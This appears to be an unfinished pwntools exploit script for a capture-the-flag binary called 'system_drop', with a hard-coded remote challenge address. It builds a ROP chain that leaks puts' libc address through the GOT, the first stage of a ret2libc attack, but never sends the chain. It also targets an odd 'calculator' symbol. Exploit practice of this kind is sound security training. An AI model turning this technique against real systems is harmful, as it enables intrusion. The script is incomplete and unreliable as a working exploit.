from pwn import *

def b2h(in_bytes: bytes):
    out_str = ''
    for j in range(math.ceil(len(in_bytes) / 4)):
        out_str += ''.join([str(hex(in_bytes[j*4+3-k]))[2:].rjust(2, '0') for k in range(4)]) + ':'
    return out_str[:-1]


os.system('pkill -9 gdb')
context.terminal = ['tmux', 'splitw', '-h', '-I']
context.arch = 'amd64'

elf = ELF('./system_drop')
local = True

if local:
    proc = elf.process()
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    proc = remote('178.62.50.172', 32338)
    context.noptrace = True
    # libc = ELF('./libc.so.6')

gdb.attach(proc, '\n'.join([
    'c'
]) + '\n')

rop_libc = ROP([elf])
rop_libc.call(elf.plt['puts'], [elf.got['puts']])
rop_libc.call(elf.symbols['calculator'])

proc.interactive()
